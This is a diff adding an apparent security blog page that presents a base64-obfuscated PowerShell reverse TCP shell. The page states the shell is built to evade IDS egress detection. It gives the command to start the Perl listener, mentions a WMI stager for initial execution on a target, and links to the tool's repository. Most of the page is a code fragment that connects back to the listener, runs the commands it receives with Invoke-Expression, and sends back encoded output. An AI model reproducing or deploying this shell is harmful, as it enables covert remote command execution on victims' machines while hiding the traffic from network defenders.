@@ -1,0 +1,96 @@
+<html><head><title>tcp shell with base64 encoding</title> <style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head> <body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 11pt"><pre><hr>|| base64-tcp-shell || 04/08/2016 || <a style="text-decoration: none" href="../"><span style="text-decoration: none">Back to main</span></a><hr></pre><pre>
+
+I created a variant of the tcp powershell client that encodes the in plain text TCP traffic with 
+custom base64 encoding. This should help evade some IDS egress detection methods without having 
+to resort to using SSL/webserver, C2, blah, blah, blah...
+
+before using make sure you edit the b64-tcp-client.ps1 script before executing it on a target system.
+
+All that's required for the listener is a system that can run Perl :D
+
+To start the listener:
+
+	root@null:~# ./b64-tcp-handler.pl [ specify port to listen on ]
+
+
+
+It also includes a template wmi stager but you can use gen-obfuscated or whatever works for you 
+to get initial execution.
+
+You can get a copy of it from github here.
+
+<a style="text-decoration: none" href="https://github.com/xor-function/fathomless/tree/master/base64-tcp-shell">https://github.com/xor-function/fathomless/tree/master/base64-tcp-shell</a>
+
+
+
+here is an incomplete code sample which shows the basic modd.
+
+######################## CODE FRAGMENT, INCOMPLETE! #########################
+
+	# Connect back if the reverse switch is used.
+	$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+
+	 $stream = $client.GetStream()
+	[byte[]]$bytes = 0..65535|%{0}
+
+	#[->]Send back general info
+	$profile = ( Invoke-Expression -Command get-info 2>&1 | Out-String )
+	$prompt = "RSH => " + (Get-Location).Path + '> '
+	$initPrompt = "Windows PowerShell: Copyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n" + "$profile" + "`n" + "$prompt"
+
+	#[->] B64 encode info before transport
+	$encPrompt = base64string-encode $initPrompt
+
+	$encSubPrompt = b64Sub $encPrompt
+
+	$sendbytes = ([text.encoding]::ASCII).GetBytes($encSubPrompt)
+	$stream.Write($sendbytes,0,$sendbytes.Length)
+
+	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+	{
+
+		$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+		$Rb64Subdata = $EncodedText.GetString($bytes,0, $i)
+
+		#[->] de-obfuscate base64 data
+		$Rb64Encdata = b64Desub $Rb64Subdata
+
+		#[->] Decode base64 commands
+		$data = base64string-decode $Rb64Encdata
+
+		try
+		{
+			#Execute the command on the target.
+			$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+		}
+		catch
+		{
+			Write-Warning "Something went wrong with execution of command on the target." 
+			Write-Error $_
+		}
+
+		$sendback2 = $sendback + "RSH => " + (Get-Location).Path + '> '
+		$x = ($error[0] | Out-String)
+		$error.clear()
+		$sendback3 = $sendback2 + $x
+
+		#[->] Base64 encode the results
+		$b64Result = base64string-encode $sendback3
+
+		$subb64Result = b64Sub $b64Result
+
+		#Return the results
+		$sendbyte = ([text.encoding]::ASCII).GetBytes($subb64Result)
+		$stream.Write($sendbyte,0,$sendbyte.Length)
+		$stream.Flush()
+	}
+
+	$client.Close()
+	if ($listener) {
+		$listener.Stop()
+	}
+  } 
+	
+######################## CODE FRAGMENT, INCOMPLETE! #########################
+
+</pre></body></html>
